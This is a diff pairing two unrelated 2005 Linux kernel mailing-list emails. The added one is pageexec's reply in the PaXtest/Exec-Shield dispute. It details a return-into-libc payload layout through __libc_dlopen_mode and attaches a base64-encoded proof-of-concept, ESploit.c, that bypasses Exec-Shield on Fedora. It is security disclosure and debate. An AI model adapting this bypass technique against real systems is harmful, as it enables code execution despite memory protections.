@@ -1,59 +1,136 @@
-Return-Path: <linux-kernel-owner+willy=40w.ods.org-S261427AbVBGOXK@vger.kernel.org>
+Return-Path: <linux-kernel-owner+willy=40w.ods.org-S261430AbVBGO2h@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S261427AbVBGOXK (ORCPT <rfc822;willy@w.ods.org>);
-	Mon, 7 Feb 2005 09:23:10 -0500
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261426AbVBGOXK
+	id S261430AbVBGO2h (ORCPT <rfc822;willy@w.ods.org>);
+	Mon, 7 Feb 2005 09:28:37 -0500
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261434AbVBGO2h
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Mon, 7 Feb 2005 09:23:10 -0500
-Received: from gprs215-44.eurotel.cz ([160.218.215.44]:8101 "EHLO amd.ucw.cz")
-	by vger.kernel.org with ESMTP id S261427AbVBGOWq (ORCPT
-	<rfc822;linux-kernel@vger.kernel.org>);
-	Mon, 7 Feb 2005 09:22:46 -0500
-Date: Mon, 7 Feb 2005 15:22:19 +0100
-From: Pavel Machek <pavel@ucw.cz>
-To: Helge Hafting <helge.hafting@hist.no>
-Cc: Jon Smirl <jonsmirl@gmail.com>,
-       Stefan =?iso-8859-1?Q?D=F6singer?= <stefandoesinger@gmx.at>,
-       acpi-devel@lists.sourceforge.net,
-       Ondrej Zary <linux@rainbow-software.org>,
-       Matthew Garrett <mjg59@srcf.ucam.org>,
-       Carl-Daniel Hailfinger <c-d.hailfinger.devel.2005@gmx.net>,
-       ncunningham@linuxmail.org,
-       Linux Kernel Mailing List <linux-kernel@vger.kernel.org>
-Subject: Re: [ACPI] Re: [RFC] Reliable video POSTing on resume
-Message-ID: <20050207142219.GC8040@elf.ucw.cz>
-References: <20050122134205.GA9354@wsc-gmbh.de> <4204B3C1.80706@rainbow-software.org> <9e473391050205074769e4f10@mail.gmail.com> <200502051748.43547.stefandoesinger@gmx.at> <9e47339105020509382adbbf39@mail.gmail.com> <420740F1.5050609@hist.no>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <420740F1.5050609@hist.no>
-X-Warning: Reading this can be dangerous to your mental health.
-User-Agent: Mutt/1.5.6+20040907i
+	Mon, 7 Feb 2005 09:28:37 -0500
+Received: from gizmo08bw.bigpond.com ([144.140.70.18]:39637 "HELO
+	gizmo08bw.bigpond.com") by vger.kernel.org with SMTP
+	id S261430AbVBGOXy (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
+	Mon, 7 Feb 2005 09:23:54 -0500
+From: pageexec@freemail.hu
+To: Ingo Molnar <mingo@elte.hu>
+Date: Tue, 08 Feb 2005 00:23:37 +1000
+MIME-Version: 1.0
+Content-type: Multipart/Mixed; boundary=Message-Boundary-6397
+Subject: Re: Sabotaged PaXtest (was: Re: Patch 4/6  randomize the stack pointer)
+Reply-to: pageexec@freemail.hu
+CC: linux-kernel@vger.kernel.org, Arjan van de Ven <arjanv@redhat.com>,
+       "Theodore Ts'o" <tytso@mit.edu>
+Message-ID: <42080689.15768.1B0C5E5F@localhost>
+In-reply-to: <20050203202032.GA24192@elte.hu>
+References: <4202BFDB.24670.67046BC@localhost>
+X-mailer: Pegasus Mail for Windows (4.21c)
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Hi!
 
-> >The problem with the radeon reset code is that there are many, many
-> >variations of the radeon chips, including different steppings of the
-> >same part. The ROM is matched to the paticular bugs of the chip. From
-> >what I know ATI doesn't even have a universal radeon reset program.
-> > 
-> >
-> Maybe they could provide such a program, if asked?
-> Basically, a chip detect and a switch statement containing all
-> the bios reset sequences they have.
-> 
-> They may want to protect "trade secrets" about innovative
-> 3D-pipelines and such.  But the bios reset is probably not that
-> high-end, so perhaps they could provide source code for it?
+--Message-Boundary-6397
+Content-type: text/plain; charset=US-ASCII
+Content-transfer-encoding: 7BIT
+Content-description: Mail message body
 
-Try asking them, then ;-)....
+> still wrong. What you get this way is a nice, complicated NOP.
 
-Asked the right way, they might even tell you. I believe right way is
-"I'd like to buy 10000 cards, but I need suspend-to-RAM to work".
+not only a nop but also a likely crash given that i didn't adjust
+the declaration of some_function appropriately ;-). let's cater
+for less complexity too with the following payload (of the 'many
+other ways' kind):
 
-								Pavel
--- 
-People were complaining that M$ turns users into beta-testers...
-...jr ghea gurz vagb qrirybcref, naq gurl frrz gb yvxr vg gung jnl!
+[field1 and other locals replaced with shellcode]
+[space to cover the locals of __libc_dlopen_mode()]
+[fake EBX]
+[fake ESI]
+[fake EBP]
+[address of field1 (shellcode)]
+[address of user_input+x, ends with "libbeecrypt.so"]
+[fake mode for __libc_dlopen_mode(), 0x01010101 will do]
+[space for the local variables of __libc_dlopen_mode() and others]
+[saved EBP replaced with address of [fake EBP]]
+[saved EIP replaced with address of __libc_dlopen_mode()+3]
+[user_input no longer used in the exploit]
+
+user_input (the original, untouched buffer) ends with a suitable
+library name (such as "libbeecrypt.so", see [1]). this string could
+have also been left behind in the address space somewhere during
+earlier interactions. we have to produce one 0 byte only hence
+we're back at the generic single overflow case. this also no longer
+relies on the user_input argument being at a particular address on
+the stack, so it's a generic method in that regard as well.
+
+one disadvantage of this approach is that now not only the
+randomness in libc.so has to be found but also that of the stack
+(repeating parts of the payload would help reduce it though), and
+if user_input itself is on the heap (and there're no copies on the
+stack), we'll need that randomness too.
+
+in any case, you got your exploit method against latest Fedora (see
+the attachment [2]), this should prove that paxtest does the right
+thing when it exposes the weaknesses of Exec-Shield. now, will you
+and Arjan do the right thing and apologize to us or do you still
+maintain that paxtest is a sabotage?
+
+[1] https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=132149
+    it also appears that not only the design and implementation of
+    PT_GNU_STACK are broken but its deployment as well. not even
+    its creators managed to get it right, what can we expect from
+    unsuspecting distros? 5 months and still no resolution? does
+    this backdoor really belong into linux?
+
+[2] ESploit.c is a simple proof of concept self-exploiting test
+    that will hang itself when successful. compiler optimizations
+    and randomizations can introduce 0 bytes in some of the
+    addresses used (check shellcode length), play with them a bit
+    to get it to run. stack usage in the (ab)used libc functions
+    may also require adjusting the buffer sizes.
+
+
+--Message-Boundary-6397
+Content-type: text/plain; charset=US-ASCII
+Content-disposition: inline
+Content-description: Attachment information.
+
+The following section of this message contains a file attachment
+prepared for transmission using the Internet MIME message format.
+If you are using Pegasus Mail, or any other MIME-compliant system,
+you should be able to save it or view it from within your mailer.
+If you cannot, please ask your system administrator for assistance.
+
+   ---- File information -----------
+     File:  ESploit.c
+     Date:  8 Feb 2005, 0:07
+     Size:  1294 bytes.
+     Type:  Program-source
+
+--Message-Boundary-6397
+Content-type: Application/Octet-stream; name="ESploit.c"; type=Program-source
+Content-disposition: attachment; filename="ESploit.c"
+Content-transfer-encoding: BASE64
+
+I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPGRsZmNu
+Lmg+CgpjaGFyIGJ1ZmZlcls4MTkyXTsKdm9pZCAqIGhhbmRsZSwgKiBteWRsb3BlbiwgKiBy
+ZXRhZGRyOwp1bnNpZ25lZCBsb25nIGVpcCwgZmFrZWVicCwgKiB0bXAgPSAodW5zaWduZWQg
+bG9uZyopYnVmZmVyOwoKdm9pZCBvdmVyZmxvdyhjaGFyICogZmllbGQxLCBjaGFyICogdXNl
+cl9pbnB1dCkKewogIHN0cmNweShmaWVsZDEsIHVzZXJfaW5wdXQpOwp9CgppbnQgbWFpbigp
+CnsKICB1bnNpZ25lZCBsb25nIHNoZWxsY29kZVsxMDI0XTsKCiAgaGFuZGxlID0gZGxvcGVu
+KE5VTEwsIFJUTERfTEFaWSk7CiAgaWYgKCFoYW5kbGUpIHsKICAgIHByaW50ZigiZGxvcGVu
+IGVycm9yOiAlc1xuIiwgZGxlcnJvcigpKTsKICAgIHJldHVybiAtMTsKICB9CiAgZGxlcnJv
+cigpOwogIG15ZGxvcGVuID0gZGxzeW0oaGFuZGxlLCAiX19saWJjX2Rsb3Blbl9tb2RlIik7
+CiAgaWYgKCFkbGVycm9yKSB7CiAgICBwcmludGYoImRsc3ltIGVycm9yXG4iKTsKICAgIHJl
+dHVybiAtMTsKICB9CiAgcHJpbnRmKCJteWRsb3BlbjogJXBcbiIsIG15ZGxvcGVuKTsKCiAg
+cmV0YWRkciA9IF9fYnVpbHRpbl9yZXR1cm5fYWRkcmVzcygwKTsKICBwcmludGYoInJldGFk
+ZHI6ICVwXG4iLCByZXRhZGRyKTsKCiAgZm9yIChlaXA9MDsgZWlwPDE2Mzg0OyBlaXArKykg
+ewogICAgaWYgKHNoZWxsY29kZVtlaXBdID09ICh1bnNpZ25lZCBsb25nKXJldGFkZHIpCiAg
+ICAgIGJyZWFrOwogIH0KICBpZiAoMTYzODQgPT0gZWlwKSB7CiAgICBwcmludGYoImNhbid0
+IGZpbmQgc2F2ZWQgRUlQXG4iKTsKICAgIHJldHVybiAtMTsKICB9CiAgcHJpbnRmKCJzYXZl
+ZCBFSVA6ICVwIGF0IGluZGV4ICV1XG4iLCBzaGVsbGNvZGUrZWlwLCBlaXApOwoKICBtZW1z
+ZXQoYnVmZmVyLCAweEZBLCBzaXplb2YgYnVmZmVyKTsKICBidWZmZXJbMF0gPSAweEVCOwog
+IGJ1ZmZlclsxXSA9IDB4RkU7CiAgZmFrZWVicCA9IGVpcC0xMDAwOwogIHRtcFtlaXAtMV0g
+PSAmc2hlbGxjb2RlW2Zha2VlYnBdOwogIHRtcFtlaXBdID0gKGNoYXIqKW15ZGxvcGVuKzM7
+CiAgdG1wW2VpcCsxXSA9IDA7CiAgdG1wW2Zha2VlYnArMV0gPSBzaGVsbGNvZGU7CiAgdG1w
+W2Zha2VlYnArMl0gPSAibGliYmVlY3J5cHQuc28iOwogIHRtcFtmYWtlZWJwKzNdID0gMHgw
+MTAxMDEwMTsKICBwcmludGYoInNoZWxsY29kZSBsZW5ndGg6ICV4XG4iLCBzdHJsZW4oYnVm
+ZmVyKSk7CiAgb3ZlcmZsb3coc2hlbGxjb2RlLCBidWZmZXIpOwogIHJldHVybiAwOwp9Cg==
+
+--Message-Boundary-6397--
